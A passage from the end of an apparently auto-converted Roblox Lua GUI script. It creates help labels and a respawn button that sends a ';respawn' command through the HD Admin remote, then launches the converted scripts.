TextLabel3.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel3.Text = "you might need to buy admin in these games for it to work."
TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel3.TextScaled = true
TextLabel3.TextSize = 14
TextLabel3.TextWrapped = true
TextLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Position = UDim2.new(0.497963041, 0, 0.350649357, 0)
TextLabel3.Size = UDim2.new(0, 261, 0, 81)
TextLabel3.Parent = Page5

local TextLabel4 = Instance.new("TextLabel")
TextLabel4.Name = "TextLabel"
TextLabel4.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel4.Text = "if clicking the button to teleport to the game dosent work then just search the name."
TextLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel4.TextScaled = true
TextLabel4.TextSize = 14
TextLabel4.TextWrapped = true
TextLabel4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel4.BackgroundTransparency = 1
TextLabel4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel4.BorderSizePixel = 0
TextLabel4.Position = UDim2.new(0.497963041, 0, 0.561038971, 0)
TextLabel4.Size = UDim2.new(0, 261, 0, 81)
TextLabel4.Parent = Page5


end
do -- chunk 6/6
local respawn = Instance.new("TextButton")
respawn.Name = "respawn"
respawn.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
respawn.Text = "RESPAWN"
respawn.TextColor3 = Color3.fromRGB(255, 255, 255)
respawn.TextScaled = true
respawn.TextSize = 14
respawn.TextWrapped = true
respawn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
respawn.BorderColor3 = Color3.fromRGB(0, 242, 255)
respawn.BorderSizePixel = 2
respawn.Position = UDim2.new(0.222519785, 0, -0.241216138, 0)
respawn.Size = UDim2.new(0, 61, 0, 31)
respawn.Parent = R[2]

local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = respawn
__S[#__S + 1] = function(...)
local script = LocalScript
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommandSilent:InvokeServer(";respawn")
end)
end


end
-- @@FOOTER
-- instance references
-- start all converted scripts
for _, __fn in ipairs(__S) do task.spawn(__fn) end
